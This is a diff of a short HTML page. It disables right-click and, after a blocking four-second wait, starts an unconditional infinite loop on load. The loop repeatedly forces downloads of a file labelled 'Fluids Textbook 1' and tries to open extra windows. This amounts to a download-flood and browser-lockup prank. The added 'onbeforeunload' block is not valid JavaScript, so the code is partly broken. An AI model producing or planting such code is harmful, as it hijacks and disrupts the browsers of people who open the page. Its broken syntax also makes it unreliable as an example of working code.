@@ -2,21 +2,29 @@
 <body oncontextmenu="return false;">
 <a href="" id="downlink" style="display:none" download="">a</a>
 <script>
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
   
   function download(file) {
     var link = document.getElementById("downlink");
     link.setAttribute("download",file);
     link.click()
   };
-  
-  window.addEventListener('message', function(e) {
-  var message = e.data;
-  if (message == hi) {
+ 
+  sleep(4000)
+ 
     for (;;) {
       download("./Fluids Textbook 1")
+      onbeforeunload {
+        window.open("./haha")
+      }
     }
-  } 
-});
+  
 </script>
   </body>
   
